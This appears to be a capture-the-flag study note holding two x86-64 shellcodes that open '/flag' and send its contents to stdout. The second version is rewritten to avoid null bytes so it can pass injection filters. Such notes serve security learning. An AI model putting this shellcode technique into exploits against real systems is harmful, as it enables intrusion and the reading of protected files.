---
tags:
  - binary_exploitation
  - security
---
# Unobfuscated
```
.intel_syntax noprefix
.global _start
_start:
mov rbx, 0x00000067616c662f
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 40
syscall
mov rax, 60
syscall

```

# Obfuscated to remove null bytes
```
.intel_syntax noprefix
.global _start
_start:
mov rbx, 0x11111178727d7740
mov rax, 0x1111111111111111
sub rbx, rax
push rbx
xor rax, rax
inc rax
inc rax
mov rdi, rsp
xor rsi, rsi 
syscall
xor rdi, rdi
inc rdi
mov rsi, rax
xor rdx, rdx 
mov r10, 111111111
mov r9, 111110111
sub r10, r9
mov rax, 111111159
mov rbx, 111111119
sub rax, rbx
syscall
mov rax, 111111179
sub rax, rbx
syscall
```
# Comments
![[Shellcode For Read Flag-20250208010153723.webp]]

